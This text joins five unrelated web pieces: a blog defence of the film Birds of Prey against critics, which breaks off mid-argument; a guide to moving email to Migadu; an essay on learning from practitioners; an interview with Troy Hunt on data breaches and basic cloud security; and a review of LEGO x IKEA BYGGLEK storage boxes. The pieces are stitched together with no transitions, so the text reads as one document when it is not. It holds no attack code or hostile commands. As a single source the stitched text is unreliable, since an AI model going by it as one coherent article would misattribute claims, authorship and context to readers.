<figure><img data-attachment-id="1226" data-permalink="https://weebtrash.ga/2020/08/27/why-do-people-hate-birds-of-prey/image-1-7/" data-orig-file="https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?fit=838%2C502&amp;ssl=1" data-orig-size="838,502" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?fit=300%2C180&amp;ssl=1" data-large-file="https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?fit=678%2C406&amp;ssl=1" loading="lazy" width="678" height="406" src="https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?resize=678%2C406&amp;ssl=1" alt="Why do people hate Birds of Prey?" srcset="https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?w=838&amp;ssl=1 838w, https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?resize=300%2C180&amp;ssl=1 300w, https://i0.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-1.png?resize=768%2C460&amp;ssl=1 768w" sizes="(max-width: 678px) 100vw, 678px" data-recalc-dims="1"></figure>



<p>If you stare long enough at what is generally panned by certain niche demographics, you start to see a trend. This trend comes into focus when it butts up against films with similar “methods” that are beloved despite holding similar flaws.</p>



<p>I read <a rel="noreferrer noopener" href="https://www.newyorker.com/culture/the-front-row/birds-of-prey-reviewed-the-wasted-exertions-of-margot-robbie" target="_blank">this article</a>—somehow finding itself lodged like a wet loogie in the skull of the New Yorker—and really only have one key take-away:</p>



<p>Margot Robbie is probably the problem, or perhaps, <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Harley_Quinn" target="_blank">Harley Quinn</a> herself.</p>



<p>Keep the following quote in mind, because it’s the defining sentence of the messy gish-gallop in question:</p>



<blockquote><p>Harley’s backstory depends on a barely coherent batch of elements that fit together too casually to develop any substantial psychology.</p></blockquote>



<p><strong>Let’s move our focus to Captain America: Civil War, because it <em>should</em> elicit a similar criticism:</strong></p>



<div><figure><img data-attachment-id="1228" data-permalink="https://weebtrash.ga/2020/08/27/why-do-people-hate-birds-of-prey/captain-america-civil-war-is-terrible/" data-orig-file="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/captain-america-civil-war-is-terrible.gif?fit=485%2C200&amp;ssl=1" data-orig-size="485,200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="captain-america-civil-war-is-terrible" data-image-description="" data-medium-file="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/captain-america-civil-war-is-terrible.gif?fit=300%2C124&amp;ssl=1" data-large-file="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/captain-america-civil-war-is-terrible.gif?fit=485%2C200&amp;ssl=1" loading="lazy" width="485" height="200" src="https://i2.wp.com/weebtrash.ga/wp-content/uploads/2020/08/captain-america-civil-war-is-terrible.gif?resize=485%2C200&amp;ssl=1" alt="Captain America: Civil War is terrible" data-recalc-dims="1"></figure></div>



<p><a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Captain_America:_Civil_War" target="_blank">Captain America: Civil War</a> sits between blow-out Avengers mess and OOC solo exploration. Since Birds of Prey occupies a space between “crew comes together” and “character journey things”, it’s a fair comparison</p>



<p>Captain America: Civil War asks you know the characters already, and buy that Steve Rogers would start a war to save someone he isn’t in actual love with (Bucky Barnes).</p>



<p>There’s a lot of suspension of disbelief in this film, OOC writing, as well as asking the audience to understand things that exist elsewhere in cinematic—and comic book—universes. </p>



<p><strong>This happens constantly with comic book movies.</strong></p>

<p>The Avengers films—at large—feed off of one another, offer an “in” for viewers to appreciate the characters therein, and expect the audience to hold characterization between pieces of media.</p>



<p><strong>It is a current trend; only true nerds know what’s up.</strong></p>



<figure><img src="https://i1.wp.com/behindthepanels.net/wp-content/uploads/2015/05/harley-revolution001f.jpg?w=678&amp;ssl=1" alt="The (r)evolution of Harley Quinn: from jester to sex symbol ..." data-recalc-dims="1"><figcaption>Source: <a href="http://behindthepanels.net/the-revolution-of-harley-quinn-from-jester-to-sex-symbol/">http://behindthepanels.net/the-revolution-of-harley-quinn-from-jester-to-sex-symbol/</a></figcaption></figure>



<p>Birds of Prey doesn’t require prior viewing of Suicide Squad, but it does ask that you know who Harley Quinn, even just a little bit. </p>



<p>It is a continuum of a story, which is a device many contemporary comic book films beg viewers engage with.</p>



<p>This is just one reason why the above explanation of Birds of Prey’s flaws is flimsy at best.</p>



<p>If Birds of Prey does it (and I’d argue well enough to not need nearly as much media knowledge), while so many others films do, why is this a fair critique?</p>



<p>It isn’t, and that’s where the trend begins to take shape.</p>



<h2>Bad characterization is another problem Birds of Prey suffers from</h2>



<h3>Yet, characterization also lives in the tapestry of how a film is made…</h3>



<figure><img data-attachment-id="1229" data-permalink="https://weebtrash.ga/2020/08/27/why-do-people-hate-birds-of-prey/image-2-7/" data-orig-file="https://i1.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-2.png?fit=589%2C380&amp;ssl=1" data-orig-size="589,380" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i1.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-2.png?fit=300%2C194&amp;ssl=1" data-large-file="https://i1.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-2.png?fit=589%2C380&amp;ssl=1" loading="lazy" width="589" height="380" src="https://i1.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-2.png?resize=589%2C380&amp;ssl=1" alt="" srcset="https://i1.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-2.png?w=589&amp;ssl=1 589w, https://i1.wp.com/weebtrash.ga/wp-content/uploads/2020/08/image-2.png?resize=300%2C194&amp;ssl=1 300w" sizes="(max-width: 589px) 100vw, 589px" data-recalc-dims="1"></figure>



<p>Another issue with this particular critique is explained with poor <a rel="noreferrer noopener" href="https://weebtrash.ga/2020/07/04/sorry-sometimes-stuff-isnt-simple/" target="_blank">media literacy</a>. Despite the article in question being well written, it shows a lack of the capacity to analyze environment, action, aesthetics, and comedy as characterization.</p>



<p>Birds of Prey asks that you understand that the comedy, dotted like neon sequins throughout, is a character itself—a portrait, if you will.</p>



<p>The film’s flavor is Harley Quinn, in form, function, and expression. This is her emancipation, this is her ethos. This is the world through her eyes, this is who she is.</p>



<figure><div>
<p><span><iframe width="678" height="382" src="https://www.youtube.com/embed/VyZ-Gj658i8?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span></p>
</div></figure>



<p>This is a form of film-making I love most. </p>



<p>One where a soundtrack, setting, choice of writing style, aesthetic, devices, and general form all act as beacons for what isn’t said. It’s molding the film to the interior of its concepts, using the exterior experience as a canvas.</p>



<p>Never you mind that the other characters receive much the same treatment as Harley does, in glossy, stylized glory, with title cards and phrasings of personality.</p>

<p>This is Black Canary, a kept bird who could be, and becomes, and is, a force to be reckoned with. She reclaims her power by addressing the trauma of her mother’s death, and it’s a sight to behold.</p>

<p>This is Cassandra Cain, who will eventually adopt the Batgirl title. She gets a real taste of the criminal underworld in Birds of Prey by being thrust into the drama, and her thieving ways may yet be stymied by the events therein.</p>

<p>This is Huntress, who is somehow both awkward and bad ass at the same time. Every scene she’s the focus of breathes the newness of a caped vigilante, contingent on revenge, who will go on to do great things.</p>

<p>This is Renee Montoya, who deals with sexism in the police force so impossibly powerful that she sides with the bad girls club of the Birds of Prey to get shit done. She is tired. <em>I am also tired</em>. </p>



<p>We are all tired of fighting the insecure, watered down, man-baby cousins of Black Mask in our waking life.</p>

<p>This is Black Mask (Roman Sionis). He has a thing for peeling off peoples’ faces. He thinks himself very amazing, while simultaneously having the fragility of a strand of dry pasta. He represents many things, all of which are apparent if one actually watches the film.</p>

<p>There are more characters to discuss, namely Victor Zsasz, who deserved more characterization, but is amusingly situated as Roman Sionis’ partner in crime and boyfriend. That is still a whole lot of character to contend with, and I would love to see how he progresses.</p>

<p>These are the characters. This is who they are in shots framed, in bubbling glasses from sonic super powers, in color and action, and so much more.</p>



<p>I want to see more of the rest of the crew, and am hoping for a sequel that explores their characters more deeply.</p>



<p>Which we may never get because people who think themselves Very Intelligent™ have maligned this film enough to potentially slap away a second helping.</p>



<p>To think the film lacks characterization is inaccurate: it doesn’t. It simply asks you to not only view but participate in understanding what is said in the meat of how the film was made.</p>



<p>The meat of the film is about a group of women. Who they are, what they stand for, and what they fight against.</p>



<p>Therein our trend starts to take shape.</p>



<h2>Birds of Prey Sucked, because various reasons…</h2>



<h3>That don’t make sense, but apparently are wildly agreed with</h3>

<p>Let’s go down the laundry list of what this particular <a rel="noreferrer noopener" href="https://youtu.be/JXKUriED2gg" target="_blank">viral Youtube Rant outlines </a>as reasons for Birds of Prey being a terrible film. It’s fairly easy to serve up criticism for the lack of intellectual honesty and apparent misunderstanding of the entire Batman universe.</p>



<p><strong>1 – The market doesn’t exist, so why even make the film.</strong></p>



<p>It exists. The film just wasn’t made specifically with you in mind. Simple. Next.</p>

<p><strong>2 – The Joker is suspiciously absent from this film.</strong></p>



<p>This is irrelevant. It’s a film about the Birds of Prey and the emancipation of Harley Quinn. He is relegated as no longer necessary for Harley’s growth. Next.</p>

<p><strong>3 – Harley and Joker broke up because she was apparently the mastermind behind many of his plans, and This Is Inaccurate.</strong></p>



<p>As per Harley’s origins in <a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Batman:_The_Animated_Series" target="_blank">Batman: The Animated Series</a>, it’s proven she has good ideas. It’s proven The Joker does not like when she steals the spotlight.</p>



<p>It’s proven he maligns her intelligence. If you didn’t know this, it’s time to go find her origins, which exist in television, not the comics.</p>



<p>I’m apparently the Real Batman Fan who knows these things, or something.</p>

<p><strong>4 – “Realistically” Harley wouldn’t stay in Gotham once The Joker no longer offers her protection by the grace of their toxic relationship.</strong></p>



<p>I guess getting dunked in a vat of chemicals and becoming pasty-faced and More Evil is somehow realistic. I guess a man in a Bat outfit punching villains into a coma is realistic. I guess a man in a scarecrow outfit gassing people with Fear Toxin is realistic.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"><p>Like many things, moving to Migadu from another email hosting provider is a two step process:</p>
<ol>
<li>Deciding that Migadu is the right option for you</li>
<li>Making the switch</li>
</ol>

<p>Just recently, Migadu went through a <a href="https://www.migadu.com/blog/redesign/" target="_blank" rel="noopener noreffer">redesign</a>. Here are some helpful links for learning about their services:</p>
<ul>
<li><a href="https://www.migadu.com/pricing/" target="_blank" rel="noopener noreffer">Pricing</a></li>
<li><a href="https://www.migadu.com/procon/" target="_blank" rel="noopener noreffer">Pros/Cons</a></li>
</ul>
<p>The points that stuck out most to me:</p>
<ol>
<li>An account can have unlimited mailboxes on a domain at no additional charge.</li>
<li>There is a soft limit of 5 registered domains on the micro plan</li>
<li>Competitive Pricing</li>
</ol>
<p>Combining these points, and you’re telling me that with the micro plan I get unlimited mailboxes, 5 domains, all for a quarter of the price of a single domain on GSuite? Sign me up! I expect this feature to come in super handy when setting up email accounts on additional domains for side projects.</p>

<h2 id="setup">Setup</h2>
<ol>
<li>Sign up for Migadu and configure DNS</li>
<li>Create a mailbox for yourself</li>
</ol>
<h2 id="migration">Migration</h2>
<p>There are several options for migrating mail to migadu. Some popular options are shared <a href="https://web.archive.org/web/20190602203512/https://www.migadu.com/en/guides/mailtransfer.html" target="_blank" rel="noopener noreffer">here</a>.</p>
<p>Personally, I let Luke Smith’s <a href="https://github.com/LukeSmithxyz/mutt-wizard" target="_blank" rel="noopener noreffer">mutt-wizard</a> do most of the heavy lifting. The steps for me were to:</p>
<ol>
<li>Add my new migadu account using mutt-wizard, indicating that I want to store all of my mail locally.</li>
<li>Navigate to `~/.local/share/mail` and copy the contents of my previous mail folder my new migadu account folder. This involves changing the names of Gmail specific mailboxes to Migadu mailboxes. i.e. from “[Gmail].All Mail” to “Archive”. I also followed <a href="https://aaronweb.net/blog/2014/11/migrating-mail-between-imap-servers-using-mbsync/" target="_blank" rel="noopener noreffer">this guide</a> to strip the mbsync metadata before sending the mail to the Migadu server.</li>
<li>Run `mw sync`</li>
</ol>
<p>That’s it!</p>

<p>I lied, there’s actually a third step in the process of moving to Migadu: enjoy!</p>
<p>I’m most looking forward to avoiding the headache of setting up domain specific email accouts for side projects. Exciting times lay ahead.</p>

		<div>

			
<p>Yesterday I was thinking about who has given me the most knowledge over the years.</p>



<p>People who have taught me a lot include:</p>



<ul><li>My bosses (who tend to do the same type of work that I do rather than being dedicated managers)</li><li>My coworkers (who aren’t there to specifically teach me, but they learn and share knowledge as they go)</li><li>Random people on Stack Overflow and in blog posts found via Google</li></ul>



<p>And that leaves the people who haven’t taught me as much:</p>



<ul><li>Dedicated managers who don’t get their hands dirty </li><li>Coaches and trainers who coach and train full time</li><li>Professional authors, speakers, podcasters, bloggers, etc.</li></ul>



<p><em>I’ve learned the most from the doers rather than the trainers</em>. That’s the common theme, but I’m not totally sure why that is.</p>



<p>There are 2 obvious theories:</p>



<ul><li><strong>Theory 1</strong>: Plain old cognitive bias on my part, in that I’m more likely to listen to the doers since I subconsciously believe they’re more likely to know what they’re talking about.</li><li><strong>Theory 2</strong>: The doers <em>really do </em>know what they’re talking about more than the trainers, so knowledge from doers tends to be more useful.</li></ul>



<p>Maybe it’s a combination of those, or maybe it’s something else entirely.</p>



<p>Andy Matuschak wrote a little essay called “<a href="https://notes.andymatuschak.org/zUMFE66dxeweppDvgbNAb5hukXzXQu8ErVNv">People who write extensively about note-writing rarely have a serious context of use</a>” which fits nicely here. He says there are 2 reasons for this phenomenon:</p>



<blockquote><p>There are two related problems here:&nbsp;effective system design <em>requires insights drawn from serious contexts of use</em>, and&nbsp;powerful enabling environments usually arise as a <em>byproduct of projects pursuing their own intrinsically meaningful purposes</em>.</p><cite>Andy Matuschak</cite></blockquote>



<p>Sounds like Andy thinks my <strong>Theory 2</strong> is correct. <em>You have to do the thing to really understand how to be effective at it, because the effectiveness arises naturally out of the doing</em>. If you’re not doing it, then you won’t really understand<em> </em>it, and teaching something that you don’t really understand<em> </em>is little more than recitation. And “I used to do the thing before I became a trainer” isn’t enough, because it doesn’t take long for knowledge to become outdated.</p>



<p>Brene Brown says it more simply:</p>



<blockquote><p>If you are not in the arena getting your ass kicked on occasion, I’m not interested in or open to your feedback.</p><cite>“Dare To Lead” by Brene Brown</cite></blockquote>



<p>She’s referencing this famous Teddy Roosevelt quote:</p>



<blockquote><p>The credit belongs to the man who is actually in the arena, whose face is marred by dust and sweat and blood; who strives valiantly; who errs, who comes short again and again, because there is no effort without error and shortcoming</p><cite>Teddy Roosevelt, <a href="https://en.wikipedia.org/wiki/Citizenship_in_a_Republic#:~:text=The%20credit%20belongs%20to%20the,knows%20great%20enthusiasms%2C%20the%20great">Citizenship in a Republic</a></cite></blockquote>



<p>(Seems a little dramatic here, since a face “marred by dust and sweat and blood” means sitting at a desk staring at a computer, but hush and go with it.)</p>



<p>So if <strong>Theory 2</strong> is correct, and that we can learn less from dedicated managers and trainers than from doers, what is the value of them? I’m thinking people like:</p>



<ul><li>Productivity bloggers and YouTubers, like the people Andy’s talking about (see this <a href="https://xkcd.com/874/">relevant XKCD</a>)</li><li>Agile coaches who haven’t worked inside a real project in years except as a coach</li><li>Full time managers tasked with helping developers grow despite maybe never having done any development themselves</li></ul>



<p>(Important caveat: some dedicated trainers are also doers because they keep their edge with side projects or consulting gigs, etc. These people are the cream of the crop.)</p>



<p>Maybe their value is in the volume. Maybe it’s a numbers game. Doers have more valuable knowledge, but they’re too busy doing to spread as much of it. Dedicated trainers spend all their time spreading knowledge, so even if their knowledge is 50% less valuable, they can spend 500% more time spreading it. </p>



<p>But if that were the case, then I would have learned more from them than from the doers. So maybe that’s where <strong>Theory 1</strong> comes into play, and my cognitive bias has gotten in the way of me getting as much value from dedicated trainers as I could have.</p>



<p>I don’t know, I’m still pondering. What do you think? <a href="https://twitter.com/mcrittenden">Tweet at me</a>.</p>

<p><em>This cloud conversation with Troy Hunt, Microsoft Regional Director and founder of Have I Been Pwned, has been edited and condensed for clarity.</em></p>



<p><strong>Forrest Brazeal: Troy, what’s your origin story? How did you become a legend in the world of application security?</strong></p>



<p>Troy Hunt: Kinda accidentally, to be honest. My background is in software development; I’ve been developing web apps since I was a teenager. I ended up in the corporate world for 15 years, making myself thoroughly miserable. I went through a cycle, like so many in big companies: after a few years, they tell you that you should stop writing code and become a manager. There’s no career path to stay technical.&nbsp;</p>



<p>So … I became an architect. (I’m still not sure what that means!) I drew a lot of diagrams on a lot of whiteboards, but I missed being hands-on. I started writing a blog in late 2009, which gave me an opportunity to articulate technical thoughts to the technical audience I missed. Blogging was a good outlet for me.&nbsp;</p>



<figure></figure>



<p><strong>That’s not a typical infosec background … where in all this did you pick up your security expertise?</strong></p>



<p>I’d written a bit about security, because I found there wasn’t much content out there written for developers. There’s lots written for infosec people, but they live in a different world. I got traction writing in a dev-centric fashion about security, eventually got the Microsoft MVP award, and everything sort of snowballed from there.&nbsp;</p>



<p>I would love to say I had a master plan. I’d be so happy 11 years ago if I could have looked ahead and seen where I am now. But my career path has been literally accidental all the way.</p>



<p><strong>Several years ago, you started a project called </strong><a href="https://haveibeenpwned.com/"><strong>HaveIBeenPwned</strong></a><strong> that helps people see if their personal data has been exposed in any known breaches. Hundreds of verified breaches later, the constant flood must start to feel like deja vu.&nbsp; What are some of the most common ways you see developers leave their data unprotected?&nbsp;</strong></p>



<p>Certain patterns do repeat over and over. Usually, it’s a database of some kind that is facing the web. For awhile it seemed like all the culprits were unsecured S3 buckets, then we went through a MongoDB phase. Right now public Elasticsearch instances seem to be a common target. So picking up on those patterns is certainly interesting.</p>



<p>But most interesting, to me, is the social perspective – the way organizations respond to breaches. Like, I’ll drop pretty convincing evidence of a breach, and some companies’ first move is still to deny it. And I’m like, “come on.” You can never be absolutely sure, but I don’t go public with a breach unless I’m 99% confident it’s legit.</p>



<p>I’ll give you a recent example: there’s a ride-sharing company in India called ZoomCar. Their data leaked and was being passed around through hacking forums. It was easy to establish it was legitimate data, because you could go plug in the credentials on their site and reset people’s passwords. I went to a forum and had one of the breach victims tell me the last digit of their phone number, and I provided the preceding two. The breach had already been reported in the press. Zero percent chance this isn’t real. And yet ZoomCar was still <em>vehemently denying a breach</em>.&nbsp;</p>



<p>I call it “<a href="https://www.troyhunt.com/the-5-stages-of-data-breach-grief/">the five stages of data breach grief</a>”. At first it’s deny, deny, deny, and then you get angry. But one way or the other, I am going to get you to acceptance. We can do that the easy way or the hard way. But acknowledging that you have a problem is the first step to fixing it.</p>



<p><strong>You help developers protect themselves from breaches like this by showing them a hacker’s perspective. Let’s say I’m building a cloud application, can you walk me through some things I as a dev might do to protect myself?</strong></p>



<p>Well, there’s a heap of things, so let’s pick some easy wins.&nbsp;</p>



<p>First off, put passwords on your databases!&nbsp;</p>



<p>Then, reduce your attack surface by avoiding public-facing data. People leave databases publicly accessible because it’s easy, but it’s not that hard to create a DMZ and only accept whitelisted connections.</p>



<p><strong>But there’s a movement in cloud security to avoid private networks and require services to take care of auth. Do you feel that </strong><a href="https://info.acloud.guru/resources/do-i-really-need-a-vpc"><strong>zero-trust</strong></a><strong> is a bad idea?</strong></p>



<p>I mean, the principle of it is good. The whole idea of an impenetrable perimeter around the corporate network started disappearing with USB sticks and bring-your-own devices. Now, with remote work and cloud services, it just doesn’t fly anymore.</p>



<p>But there’s a common-sense balance here. I’m not saying rely on perimeters or throw them out. I’m saying let’s apply defense in depth. Each device should be resilient in and of itself, sure. But some of them aren’t.&nbsp;</p>



<p>Like, I have no idea if I can trust my washing machine. It’s on my home network, not entirely sure why, it seemed like a good idea at the time. I try to keep it patched. But if it gets compromised, at least it’s isolated.&nbsp;</p>



<p><strong>Maybe we should stop thinking about that and go back to application security tips.</strong></p>



<p>I always try and get people to think about data minimization and data retention. That isn’t even really a technical conversation, it’s just common sense. If you don’t store the data, you don’t have to worry about losing it. So ask yourself: “Do I really need this data, and for how long?”</p>



<p>I’ll give you an example of how to screw this up. There’s a website called CatForum.com. It’s exactly what it sounds like: people go there to talk about their cats. A typical discussion would be: “Is it safe for my cat and me to eat out of the same bowl?”</p>



<p>But in order to chime in on this conversation, you must provide personal information:&nbsp; CatForum.com makes you give them your<em> date of birth</em> to sign up. Why?? It makes no sense! If they ever do experience a breach, they’ve just exposed a bunch of static, knowledge-based identification that can be used to guess access to more sensitive services.</p>



<p>Now, you might say “I need to ask this question, because my terms of service require the user to be over 13.” So why not just ask them if they’re over thirteen? “Well, they could lie to me.” I mean, they could lie to you about the date of birth too, so that makes no sense. Or if you really want them to enter the date, just do the math on their age and don’t store the DOB long-term. My point is, there’s so many ways around this problem that don’t involve unnecessarily storing personal data.</p>



<p><strong>You do some interesting things running haveibeenpwned.com </strong><a href="https://www.troyhunt.com/serverless-to-the-max-doing-big-things-for-small-dollars-with-cloudflare-workers-and-azure-functions/"><strong>really cheaply on serverless</strong></a><strong>, with Cloudflare and Azure Functions. Would you advocate that others try this? Is the cost savings still meaningful for you as you scale?</strong></p>



<p>Well, it’s mostly serverless. Everything that gets hit in anger — the search box, the pwned passwords page which is hit 25 million times a day — all serverless. The front page of the website runs on an app service, but that’s still a PaaS, and it’s massively cached on the edge with Cloudflare.&nbsp;</p>



<p>As for the bill: a full third of my costs is logging for AppInsights. So I had to downsample that. And as I add more services, that bill gets more complex. Like, I have support costs through Cloudflare — where do you add that in? It’s more amorphous.&nbsp;</p>



<p>But to put it in perspective, last January haveibeenpwned.com got a big traffic spike with 10 million visitors in one day. I took a snapshot of 72 hours of my Azure Functions costs. 72 million requests to the service worked out to, like, $34 dollars.</p>



<p>For me at this point, building with serverless is kind of like gamification. I’m always tweaking to see how low I can get the costs.</p>



<p><strong>Back to the security theme, I think a lot of people still have an idea — certainly underscored by this steady background noise of breaches — that the cloud poses heightened security risks. Do you agree?</strong></p>



<p>The charitable way to put it: cloud security is a shared responsibility. Individuals need to secure their stuff. I have a lack of patience with corporations who say “We’ll just dip a toe in cloud. But we won’t invest in doing it properly.” And now they have cloud systems operated by people who aren’t aware of security best practices.</p>



<p>So we need way more accountability around education of professionals in cloud environments.</p>



<p>But when these breaches happen over and over, you have to ask – is cloud security too easy to screw up? In the case of, say, Amazon S3, for a long time the answer was yes! And thankfully AWS has made changes in how they highlight potentially dangerous S3 settings. Because they have a responsibility to do that.</p>



<p><strong>Let’s say I want to work in cloud security, but like Troy Hunt circa 2009 I have no specific experience in that field. What is the best thing I can do for my career right now?</strong></p>



<p>Start learning. The barrier to entry is so low now. First, there’s so much content everywhere. <a href="https://acloud.guru/">A Cloud Guru</a> is great! <a href="https://www.troyhunt.com/">Troyhunt.com</a> has lots of advice!&nbsp;</p>



<p>And second, the cost is so low. The cloud services you can get access to — it’s amazing how cheaply you can do it.&nbsp;</p>



<p>Spin up a VM, play with it, shut it down. The hands-on piece is what makes learning stick. I dropped out of university, I don’t have a formal education. What I’ve learned has been through getting hands-on and seeing how things work.&nbsp;</p>



<p>And because the cloud allows me to spin things up and make mistakes without consequences, that can help me educate myself to do the right thing when the stakes are so much higher.</p>

<p><strong>A few days ago the first products with the name BYGGLEK from the cooperation between LEGO and IKEA appeared at the IKEA in Mannheim, Germany. As we now know, these were sold a “little” to early. But since the products were on the shelf for several hours, we have all products available thanks to Rob from the <a href="https://instagram.com/bricktwintowers">BrickTwinTowers</a> and can show you the BYGGLEK boxes in our review.</strong></p>
<p>It is not yet clear when the boxes will appear officially. It seems, however, that the worldwide market launch for the products of the BYGGLEK series is not planned until autumn. By the way, this series will include even more products than the four currently known.</p>

<h2><span id="general-information-about-the-boxes">General information about the boxes</span></h2>
<p>In total, the BYGGLEK range currently consists of four different products. Three of them are different boxes with LEGO studs on top. We have listed all articles for you here:</p>
<ul>
<li><strong>IKEA 103.542.08 (big box) for 14,99 Euro</strong><br>
35 x 26 x 12 cm / 44 x 32 studs, 12 bricks high</li>
<li><strong>IKEA 503.721.87 (medium box) for 12,99 Euro</strong><br>
26 x 18 x 12 cm / 32 x 22 studs, 12 bricks high</li>
<li><strong>IKEA 703.721.86 (3x small boxes) for 9,99 Euro<br>
</strong>1 pcs. 17 x 6 cm / 22 x 16 studs, 6 bricks high<br>
2 pcs. 13 x 6 cm / 16 x 11 studs, 6 bricks high</li>
</ul>
<p>The fourth product is the LEGO x IKEA BYGGLEK 40357 set with 201 LEGO bricks. It has the IKEA number 204.368.88. But we will show you this another time. This review is about the three (or actually four) different sized boxes.</p>

<p>All BYGGLEK boxes are wrapped in a cardboard box with printed LEGO bricks on the side. Both the LEGO and IKEA logos are printed on the boxes. We used a knife to help us unpack the boxes, because they are glued together and therefore difficult to open without destroying them. At least I did not make it without damaging the box. Maybe I should have kept my hands off the knife… 😉</p>

<p>The big and the middle BYGGLEK box are packed in their individual parts and have to be assembled “from scratch” (as it is common for both IKEA and LEGO 😉). Each box consists of a bottom, four side walls and a lid. The side parts are pushed into each other and the bottom is then clipped in. The lid is then placed loosely on top. The two big boxes are then exactly 12 bricks high and therefore fit perfectly into the “LEGO System”.</p>

<p><strong>I have made a small video of the construction of one of the boxes:</strong></p>

<p>After clipping in, the bottom is very tight and can only be loosened again with some effort. It is important to note that the boxes cannot be attached to each other by means of the usual clutch ppower. The boxes can therefore be easily lifted off the lid surface of another box and have easy play in all directions when standing on it.</p>
<p><strong>Here are a few more pictures of the boxes:</strong></p>


<p>The packaging of the smallest BYGGLEK box set, which consists of three boxes (two small ones, one double in size), is much thicker. These boxes do not consist of four combinable border elements, but have a continuous border and are already pre-assembled. These smaller boxes are half as high as the large boxes, i.e. exactly 6 bricks high. By the way: None of the boxes are sealed, because when you clip in the floors, small gaps remain. So the boxes can’t hold any liquids.</p>

<h2><span id="the-boxes-in-detail">The boxes in detail</span></h2>
<p>In the following we want to take a more detailed look at the boxes.</p>
<h3><span id="material">Material</span></h3>
<p>Let’s look at the material first. And how could it be otherwise, all boxes are made of white ABS plastic. So the same material LEGO bricks are made of.</p>
<p><a href="https://www.stonewars.de/wp-content/uploads/2020/07/lego-ikea-bygglek-material.jpg"><img src="https://www.stonewars.de/wp-content/uploads/2020/07/lego-ikea-bygglek-material.jpg" data-src="https://www.stonewars.de/wp-content/uploads/2020/07/lego-ikea-bygglek-material.jpg" alt="LEGO x IKEA BYGGLEK material" width="4360" height="3120" data-srcset="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material.jpg 4360w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-150x107.jpg 150w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-1024x733.jpg 1024w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-768x550.jpg 768w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-1536x1099.jpg 1536w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-2048x1466.jpg 2048w" data-sizes="(max-width: 4360px) 100vw, 4360px" srcset="https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material.jpg 4360w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-150x107.jpg 150w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-1024x733.jpg 1024w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-768x550.jpg 768w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-1536x1099.jpg 1536w, https://www.stonewars.net/wp-content/uploads/2020/07/lego-ikea-bygglek-material-2048x1466.jpg 2048w"></a></p>
<h3><span id="weight-and-volume-of-the-boxes">Weight and volume of the boxes</span></h3>
<p>To get an impression of the amount of ABS used for the boxes, we put all three items on the scale once (without packaging):</p>
<ul>
<li>Three small boxes: 434 g</li>
<li>Middle box: 754 g</li>
<li>Large box: 1220 g</li>
</ul>
<p>For comparison, I’ll use a small LEGO Star Wars UCS set: The LEGO 75181 UCS Y-Wing Fighter weighs about 1,400 g. So you get a really big amount of (single-colored) ABS with LEGO logo on the knobs for small money. It’s not completely wrong to say that if the boxes were not sold by IKEA, but exclusively manufactured and distributed by LEGO, the price would probably be much (!) higher.</p>
